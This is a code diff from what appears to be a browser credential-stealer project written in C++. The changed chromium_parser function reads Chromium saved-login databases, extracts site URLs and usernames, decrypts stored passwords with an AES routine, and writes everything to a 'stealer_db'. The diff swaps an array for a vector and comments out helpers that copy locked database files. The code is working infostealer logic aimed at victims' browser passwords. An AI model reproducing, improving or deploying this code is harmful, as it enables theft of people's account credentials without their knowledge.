@@ -35,8 +35,10 @@ std::vector<std::string> browsers_chromium = {
 BOOL chromium_parser(std::string username, std::string stealer_db)
 {
 	//Hold data
-	DataHolder* data_array = new DataHolder[SQLITE_ROW];
-	int data_index = 0;
+	//DataHolder* data_array = new DataHolder[SQLITE_ROW];
+	//int data_index = 0;
+
+	std::vector<DataHolder> data_list;
 
 	std::string target_user_data;
 	std::string target_login_data;
@@ -74,6 +76,8 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 				//std::cout << target_login_data << std::endl;
 				while (sqlite3_step(stmt) == SQLITE_ROW)
 				{
+					DataHolder data;
+
 					char* url = (char*)sqlite3_column_text(stmt, 0);
 					char* username = (char*)sqlite3_column_text(stmt, 1);
 					//char* password = (char*)sqlite3_column_text(stmt, 2);					
@@ -89,23 +93,30 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 						if ((strlen(url) == 0) || (strlen(username) == 0) || password.empty())
 							continue;
 
-						data_array[data_index].setUrl(url);
+
+						data.setUrl(url);
+						data.setUsername(username);
+						data.setHost(dir);
+
+						/*data_array[data_index].setUrl(url);
 						data_array[data_index].setUsername(username);
+						data_array[data_index].setHost(dir);*/
 
 						try
 						{
 							//decrypt password here
 							std::string decrypted_password = obj.AESDecrypter(password);
-							data_array[data_index++].setPassword(decrypted_password);
+							//data_array[data_index++].setPassword(decrypted_password);
 
-							//std::cout << "URL : " << url << std::endl;
-							//std::cout << "Username : " << username << std::endl;
-							//std::cout << "Password : " << decrypted_password << std::endl;
+							data.setPassword(decrypted_password);
+
 						}
 						catch(int e)
 						{
 							continue;
 						}
+
+						data_list.push_back(data);
 					}
 					else {
 						// Handle the case where the password_blob is null (no data)
@@ -131,58 +142,58 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 	}*/
 
 
-	if (!dump_data(stealer_db, data_array, data_index))
+	if (!dump_data(stealer_db, data_list, data_list.size()))
 		return false;
 
 	return true;
 }
 
-sqlite3_stmt* query_database(std::string target_login_data, const char* database_query)
-{
-	sqlite3* db;
-	if (sqlite3_open(target_login_data.c_str(), &db) == SQLITE_OK)
-	{
-		//std::cerr << "file found" << std::endl;
-		sqlite3_stmt* stmt = nullptr;
-		if (sqlite3_prepare_v2(db, database_query, -1, &stmt, 0) == SQLITE_OK)
-		{
-			return stmt;
-		}
-		else
-		{
-			//std::cerr << "Database file in use .... " << std::endl;
-			std::string new_target = target_login_data + "copy";
-			custom_copy_file(target_login_data, new_target);
-			// Do i need sleep here?
-			sqlite3_open(new_target.c_str(), &db);
-			sqlite3_prepare_v2(db, database_query, -1, &stmt, 0);
-
-			return stmt;
-		}
-	}
-	return nullptr;
-}
-
-BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinationFile) {
-	std::ifstream source(sourceFile, std::ios::binary);
-	if (!source) {
-		return false;
-	}
-
-	std::ofstream dest(destinationFile, std::ios::binary);
-	if (!dest) {
-		return false;
-	}
-
-	dest << source.rdbuf();
-
-	if (!dest.good()) {
-		return false;
-	}
-
-	//std::cout << "File copied successfully." << std::endl;
-	return true;
-}
+//sqlite3_stmt* query_database(std::string target_login_data, const char* database_query)
+//{
+//	sqlite3* db;
+//	if (sqlite3_open(target_login_data.c_str(), &db) == SQLITE_OK)
+//	{
+//		//std::cerr << "file found" << std::endl;
+//		sqlite3_stmt* stmt = nullptr;
+//		if (sqlite3_prepare_v2(db, database_query, -1, &stmt, 0) == SQLITE_OK)
+//		{
+//			return stmt;
+//		}
+//		else
+//		{
+//			//std::cerr << "Database file in use .... " << std::endl;
+//			std::string new_target = target_login_data + "copy";
+//			custom_copy_file(target_login_data, new_target);
+//			// Do i need sleep here?
+//			sqlite3_open(new_target.c_str(), &db);
+//			sqlite3_prepare_v2(db, database_query, -1, &stmt, 0);
+//
+//			return stmt;
+//		}
+//	}
+//	return nullptr;
+//}
+//
+//BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinationFile) {
+//	std::ifstream source(sourceFile, std::ios::binary);
+//	if (!source) {
+//		return false;
+//	}
+//
+//	std::ofstream dest(destinationFile, std::ios::binary);
+//	if (!dest) {
+//		return false;
+//	}
+//
+//	dest << source.rdbuf();
+//
+//	if (!dest.good()) {
+//		return false;
+//	}
+//
+//	//std::cout << "File copied successfully." << std::endl;
+//	return true;
+//}
 
 //bool dump_data(const std::string& db_path, DataHolder* data_array, int data_index) {
 //	sqlite3* db;
